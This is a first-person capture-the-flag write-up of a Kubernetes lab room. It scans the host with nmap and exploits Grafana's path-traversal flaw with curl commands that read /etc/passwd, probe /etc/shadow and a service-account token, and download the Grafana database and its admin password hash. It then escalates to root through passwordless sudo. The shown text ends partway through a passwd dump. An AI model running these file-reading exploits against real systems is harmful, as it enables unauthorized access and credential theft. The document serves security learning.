![](banner.png)

# Part 1

```
To access a cluster, you need to know the location of the K8s cluster and have credentials to access it. Compromise the cluster and best of luck.

Use Nmap to find open ports and gain a foothold by exploiting a vulnerable service.
```

I started with nmap TCP SYN scan, it requires root privileges and is relatively fast, as it doesn't complete three way handshake/ TCP connection. 
I additionally used `-T4 ` parameter for fast scanning, however not that fast as to lose accuracy like in `T5` setting. Use with caution, it was fine against THM target
`-p-` specifies what to ports to scan, in this case all of them. If not specified, nmap scans 1000 most common ports per protocol. 


```
root@ip-10-112-113-22:~# nmap -sS -p- -T4 10.112.151.254
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-19 11:30 UTC
Nmap scan report for ip-10-112-151-254.eu-central-1.compute.internal (10.112.151.254)
Host is up (0.00038s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
111/tcp  open  rpcbind
3000/tcp open  ppp
5000/tcp open  upnp
6443/tcp open  sun-sr-https

Nmap done: 1 IP address (1 host up) scanned in 2.45 seconds
```

Then I run version and script detection on just the open ports:

```
sudo nmap -sV -sC -p <comma-separated-open-ports> <target-IP>
```

Doing it in two passes is much faster than `-sV -sC -p-` in one go, since `-sV` is slow against all 65535 ports.

#TODO shorten output of command, leave crucial info 

```
root@ip-10-112-113-22:~# sudo nmap -sV -sC -p 22,111,3000,5000,6443 10.112.151.254
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-19 11:32 UTC
Nmap scan report for ip-10-112-151-254.eu-central-1.compute.internal (10.112.151.254)
Host is up (0.00044s latency).

PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:35:e1:4f:4e:87:45:9e:5f:2c:97:e0:da:a9:df:d5 (RSA)
|   256 b2:fd:9b:75:1c:9e:80:19:5d:13:4e:8d:a0:83:7b:f9 (ECDSA)
|_  256 75:20:0b:43:14:a9:8a:49:1a:d9:29:33:e1:b9:1a:b6 (ED25519)
111/tcp  open  rpcbind           2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 19 Oct 2026 11:32:52 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 19 Oct 2026 11:32:57 GMT
|_    Content-Length: 0
5000/tcp open  http              Werkzeug httpd 2.0.2 (Python 3.8.12)
|_http-title: Etch a Sketch
|_http-server-header: Werkzeug/2.0.2 Python/3.8.12
6443/tcp open  ssl/sun-sr-https?
| ssl-cert: Subject: commonName=kubernetes/organizationName=kubernetes
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.svc.cluster.local, DNS:localhost, IP Address:127.0.0.1, IP Address:10.112.151.254, IP Address:FE80:0:0:0:FF:E1FF:FEB3:4CD5, IP Address:10.96.0.1
| Not valid before: 2026-10-19T11:24:00
|_Not valid after:  2027-10-19T11:24:00
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: 1a821ee7-4253-416a-980c-02e36aaf1161
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Mon, 19 Oct 2026 11:33:24 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: 824e9d1c-d05d-4544-ad69-a187ba3a8653
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Mon, 19 Oct 2026 11:32:58 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: a9f4002a-9f5e-479d-bfd5-0eabc3362910
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Mon, 19 Oct 2026 11:32:58 GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.94SVN%I=7%D=10/19%Time=6AD5FFE5%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Co
SF:ntrol:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nE
SF:xpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cook
SF:ie:\x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Co
SF:ntent-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Pro
SF:tection:\x201;\x20mode=block\r\nDate:\x20Mon,\x2019\x20Oct\x202026\x201
SF:1:32:52\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Fo
SF:und</a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\
SF:nCache-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\
SF:nPragma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20H
SF:ttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Fra
SF:me-Options:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x
SF:20Mon,\x2019\x20Oct\x202026\x2011:32:57\x20GMT\r\nContent-Length:\x200\
SF:r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\
SF:n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection
SF::\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20cha
SF:rset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLS
SF:SessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port6443-TCP:V=7.94SVN%T=SSL%I=7%D=10/19%Time=6AD5FFEB%P=x86_64-pc-linu
SF:x-gnu%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
SF:0\x20Bad\x20Request")%r(GetRequest,14A,"HTTP/1\.0\x20401\x20Unauthorize
SF:d\r\nAudit-Id:\x20824e9d1c-d05d-4544-ad69-a187ba3a8653\r\nCache-Control
SF::\x20no-cache,\x20private\r\nContent-Type:\x20application/json\r\nDate:
SF:\x20Mon,\x2019\x20Oct\x202026\x2011:32:58\x20GMT\r\nContent-Length:\x20
SF:129\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\
SF:"status\":\"Failure\",\"message\":\"Unauthorized\",\"reason\":\"Unautho
SF:rized\",\"code\":401}\n")%r(HTTPOptions,14A,"HTTP/1\.0\x20401\x20Unauth
SF:orized\r\nAudit-Id:\x20a9f4002a-9f5e-479d-bfd5-0eabc3362910\r\nCache-Co
SF:ntrol:\x20no-cache,\x20private\r\nContent-Type:\x20application/json\r\n
SF:Date:\x20Mon,\x2019\x20Oct\x202026\x2011:32:58\x20GMT\r\nContent-Length
SF::\x20129\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\"
SF::{},\"status\":\"Failure\",\"message\":\"Unauthorized\",\"reason\":\"Un
SF:authorized\",\"code\":401}\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnec
SF:tion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,6
SF:7,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x
SF:20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%
SF:r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:
SF:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourReques
SF:t,14A,"HTTP/1\.0\x20401\x20Unauthorized\r\nAudit-Id:\x201a821ee7-4253-4
SF:16a-980c-02e36aaf1161\r\nCache-Control:\x20no-cache,\x20private\r\nCont
SF:ent-Type:\x20application/json\r\nDate:\x20Mon,\x2019\x20Oct\x202026\x20
SF:11:33:24\x20GMT\r\nContent-Length:\x20129\r\n\r\n{\"kind\":\"Status\",\
SF:"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\"
SF::\"Unauthorized\",\"reason\":\"Unauthorized\",\"code\":401}\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.37 seconds
```


5000 is a Flask dev server (Werkzeug), and 6443 is the kube-apiserver demanding auth (the 401s).

Port 22/SSH
This will definitely be used at the later stage to connect to the machine, however first I need to find appropriate keys/ credentials. 

Port 111 / RPC

Interesting question is never "is rpcbind open," it's "what has registered with it."
The only program listed is `100000`, which is rpcbind itself, nothing interesting has registered. That means there are no NFS exports to mount, no NIS maps to pull. Port 111 here is just the portmapper advertising its own existence. It's a dead end for this box.

Port 5000
Flask dev server (Werkzeug)

![](etch-a-sketch-website.png)

Submitting doesn't make any POST in network tab, js code from website 

```
let gridBox = document.querySelector(".gridBox");
let slider = document.querySelector("#slider");
let currValue = document.querySelector(".currValue");
let setGrid = document.querySelector(".clickSetGrid");
let reset = document.querySelector(".reset-button");


// default is set to 5 (from index.html)
let userChoice = 5; 
makeGrid(userChoice);


// sets the grid according the slider value
setGrid.addEventListener("click", ()=>{
	location.reload();
	makeGrid(slider.value);
	userChoice = slider.value;

});


// ready to draw
let trail = document.querySelectorAll(".item");
trail.forEach(function (currentValue) {
  currentValue.addEventListener("mouseover", () => {
    currentValue.classList.add("touched");
  });
});

// ready to reset
trail.forEach(function (currentValue) {
  reset.addEventListener("click", () => {
    currentValue.classList.remove("touched");
  });
});

function makeGrid(userChoice) {
  gridBox.setAttribute(
    "style",
    `grid-template: repeat(${userChoice}, 1fr) / repeat(${userChoice}, 1fr);`
  );

  for (let i = 1; i <= userChoice ** 2; i++) {
    let item = document.createElement("div");
    item.classList.add("item");
    gridBox.appendChild(item);
  }
}
```

I've looked at it quickly (too quickly - spoiler from the future) since I had my eyes on more interesting target. 

6443/kube-apiserver
It's demanding auth (the 401s).


---

Port 3000/ Grafana

```
curl -s http://10.112.151.254:3000/api/health
{
  "commit": "914fcedb72",
  "database": "ok",
  "version": "8.3.0"
}
```



Grafana has a well-known unauthenticated path traversal, CVE-2021-43798, which affects versions 8.0.0-beta1 through 8.3.0 and lets you read arbitrary local files. It does not require valid Grafana credentials, and the vulnerable route exists because every install ships with default plugins. 

The vulnerable request walks out of a plugin's asset directory. The structure is `/public/plugins/<plugin-id>/<traversal>`, using any default plugin id (e.g. `alertlist`). 

`--path-as-is` matters, otherwise curl collapses the `../` sequences before sending.

Confirmed path traversal:

```
root@ip-10-112-113-22:~# curl -s --path-as-is http://10.112.151.254:3000/public/plugins/alertlist/../../../../../../../../etc/passwdd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:[REDACTED]:/home/grafana:/sbin/nologin
```

This one gave me the password for the account, contained in comment field (normally holds a user full name). I've tried different answers for the username, however nothing I provided was accepted, grafana, root, etc. I was still searching for the username at this stage (or any additional secret/attack vector for later stage)

```
root@ip-10-112-113-22:~# curl -s --path-as-is "http://10.112.151.254:3000/public/plugins/alertlist/../../../../../../../../etc/shadow"
{
  "message": "Could not open plugin file"
}
```


This is a different error than the "Plugin file not found". This one means the file exists but the Grafana process can't open it, a permission error. So Grafana is running as the unprivileged, not root, which is why it can read world-readable `/etc/passwd` but not `root:root 0640` `/etc/shadow`. No shadow hashes for me. 


```
root@ip-10-112-113-22:~# curl -s --path-as-is "http://10.112.151.254:3000/public/plugins/alertlist/../../../../../../../../home/grafana/.bash_history"
{
  "message": "Plugin file not found"
}
root@ip-10-112-113-22:~# curl -s --path-as-is "http://10.112.151.254:3000/public/plugins/alertlist/../../../../../../../../home/grafana/.ash_history"
{
  "message": "Plugin file not found"
}
root@ip-10-112-113-22:~# curl -s --path-as-is "http://10.112.151.254:3000/public/plugins/alertlist/../../../../../../../../root/.bash_history"
{
  "message": "Could not open plugin file"
}
```

---


I've enumerated common attack vectors for exploiting grafana


```
root@ip-10-112-113-22:~# curl -s --path-as-is "http://10.112.151.254:3000/public/plugins/alertlist/../../../../../../../../proc/self/cgroup"
seeker can't seek
root@ip-10-112-113-22:~# curl -s --path-as-is "http://10.112.151.254:3000/public/plugins/alertlist/../../../../../../../../proc/self/environ"
```

```
root@ip-10-112-113-22:~# curl -s --path-as-is http://10.112.151.254:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
{
  "message": "Plugin file not found"
}
```

And saved this one to a file since it's long:

```
curl -s --path-as-is "http://10.112.151.254:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini" > grafana.log
```

Unfortunately it was a stock sample and not a real config. 


The Grafana _application_ admin account is stored in the SQLite DB, in the `user` table. That's my next pull.


It's a binary file, so I saved it rather than letting it print to the terminal:

```
curl -s --path-as-is "http://10.112.151.254:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
```


![](db.png)


![](db-user.png)

![](db-user-auth.png)

![](db-user-auth-token.png)


Content of user table 

1	0	admin	admin@localhost		fc815c2996b6c240954488fd6d4334b9ca04f55a0fbd8eb9b177edf5629f1378ca768648f3274caa13fc8cae911107c20c01	LFCzEaPggw	D0ZofGQul0		1	1	0		2022-02-10 18:54:33	2022-02-10 18:54:33	0	2012-02-10 18:54:33	0	0

However admin isn't accepted answer. 


---

```
root@ip-10-112-113-22:~# curl -s --path-as-is "http://10.112.151.254:3000/public/plugins/alertlist/../../../../../../../../var/log/grafana/grafana.log"
{
  "message": "Plugin file not found"
}
root@ip-10-112-113-22:~# curl -s --path-as-is "http://10.112.151.254:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/provisioning/datasources/datasource.yaml"
{
  "message": "Plugin file not found"
}
root@ip-10-112-113-22:~# curl -s --path-as-is "http://10.112.151.254:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/provisioning/dashboards/dashboard.yaml"
{
  "message": "Plugin file not found"
}
```

Still - I have password but no login. 

I've focused so much on grafana and still no answer. I've decided to regroup and check another sources. RPC service didn't seem to provide anything and I put my full focus on "etch-a-sketch" website. 

```
root@ip-10-112-113-22:~# gobuster dir -u "http://10.112.151.254:5000" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.js,.css
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.112.151.254:5000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,js,css
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/console              (Status: 200) [Size: 1909]
Progress: 873100 / 873104 (100.00%)
===============================================================
Finished
===============================================================
```

It quickly became clear that I dropped this lead too soon. Previously I've checked html and js of the website but disregarded css file, where a gold mine waited, commented out URL to pastebin. 

![](css.png)

![](pastebin.png)

I used CyberCher "Magic" mode to decode the message:


![](cyberchef.png)

Bingo! 


# Part 2

Having both login and password, I'm ready for the next part. 

![](ssh.png)

> If you want to keep a secret, you must also hide it from yourself. Find the secret!

Secret it is. 

`.bash_history` was empty, `.bashrc` didn't contain anything interesting

```
vagrant@johnny:~$ cat .ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbfyGA5t6yhBrLT92DNU6P8hv3MUfgTL4l33rbMAGf7/Z4EY2JtPCtctzxKvE4OBRSM2PCZ59N82w6KqBrYTpVBxbIJ3VDDQzZ9JtLiEb/8NFxXstZfsb1MCTq7o44U7/K1wG+QPCXmQX2AxEKIk7eHz6q1NPDbCTZkfKeOk7FKkSY4TlSjzfZg09Obv+DpPB800UDgeS1yW3hE0HKZJnPHIivOd7ScvxRJyFREa5o88MQ/4DS7q/kNqzuGDk180/Kf80bYBSjful5JNuTlz40b5mMIH8W7SHDcUrF6JRuRL/RuZ7tcTizjFRwIab/JtlqYHr2ktQfjJcd0NA9BeON vagrant

```


I checked which groups I'm currently in:
```
vagrant@johnny:~$ id $USER
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),998(docker)
```

I became quite happy, since I'm part of the docker group (easy privilege escalation). However next command was like a wrapped gift on a platter: 

```
vagrant@johnny:~$ sudo -l
Matching Defaults entries for vagrant on johnny:
    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vagrant may run the following commands on johnny:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
```

I was just one command from root. 

![](privilege-escalation.png)


Some enumeration that could be used later:

```
root@johnny:~# cat /root/.bash_history 
root@johnny:~# hostname
johnny
root@johnny:~# cat /etc/os-release
NAME="Ubuntu"
VERSION="18.04.3 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.3 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
root@johnny:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
    link/ether 02:ff:e1:b3:4c:d5 brd ff:ff:ff:ff:ff:ff
    inet 10.112.151.254/18 brd 10.112.191.255 scope global dynamic eth0
       valid_lft 2269sec preferred_lft 2269sec
    inet6 fe80::ff:e1ff:feb3:4cd5/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:45:eb:f2:f3 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:45ff:feeb:f2f3/64 scope link 
       valid_lft forever preferred_lft forever
5: vethae56389@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether fe:63:c6:20:c7:de brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::fc63:c6ff:fe20:c7de/64 scope link 
       valid_lft forever preferred_lft forever
7: vethd6d3be5@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether da:17:b8:c6:8a:b7 brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::d817:b8ff:fec6:8ab7/64 scope link 
       valid_lft forever preferred_lft forever
root@johnny:~# ss -tlnp
State          Recv-Q          Send-Q                    Local Address:Port                    Peer Address:Port                                                             
LISTEN         0               128                             0.0.0.0:111                          0.0.0.0:*             users:(("rpcbind",pid=542,fd=8))                   
LISTEN         0               128                           127.0.0.1:10257                        0.0.0.0:*             users:(("kube-controller",pid=1728,fd=7))          
LISTEN         0               128                           127.0.0.1:10259                        0.0.0.0:*             users:(("kube-scheduler",pid=1725,fd=7))           
LISTEN         0               128                       127.0.0.53%lo:53                           0.0.0.0:*             users:(("systemd-resolve",pid=545,fd=13))          
LISTEN         0               128                             0.0.0.0:22                           0.0.0.0:*             users:(("sshd",pid=968,fd=3))                      
LISTEN         0               128                             0.0.0.0:3000                         0.0.0.0:*             users:(("docker-proxy",pid=1438,fd=4))             
LISTEN         0               128                             0.0.0.0:5000                         0.0.0.0:*             users:(("docker-proxy",pid=1459,fd=4))             
LISTEN         0               128                                   *:6443                               *:*             users:(("kube-apiserver",pid=1246,fd=7))           
LISTEN         0               128                                [::]:111                             [::]:*             users:(("rpcbind",pid=542,fd=11))                  
LISTEN         0               128                                [::]:22                              [::]:*             users:(("sshd",pid=968,fd=4))                      
LISTEN         0               128                                [::]:3000                            [::]:*             users:(("docker-proxy",pid=1445,fd=4))             
LISTEN         0               128                                [::]:5000                            [::]:*             users:(("docker-proxy",pid=1464,fd=4))             
root@johnny:~# env
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=en_US.UTF-8
SUDO_GID=1000
USERNAME=root
SUDO_COMMAND=/bin/bash
USER=root
PWD=/root
HOME=/root
SUDO_USER=vagrant
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SUDO_UID=1000
MAIL=/var/mail/root
SHELL=/bin/bash
TERM=xterm-256color
SHLVL=1
LANGUAGE=en_US:
LOGNAME=root
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
LESSOPEN=| /usr/bin/lesspipe %s
_=/usr/bin/env
root@johnny:~# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
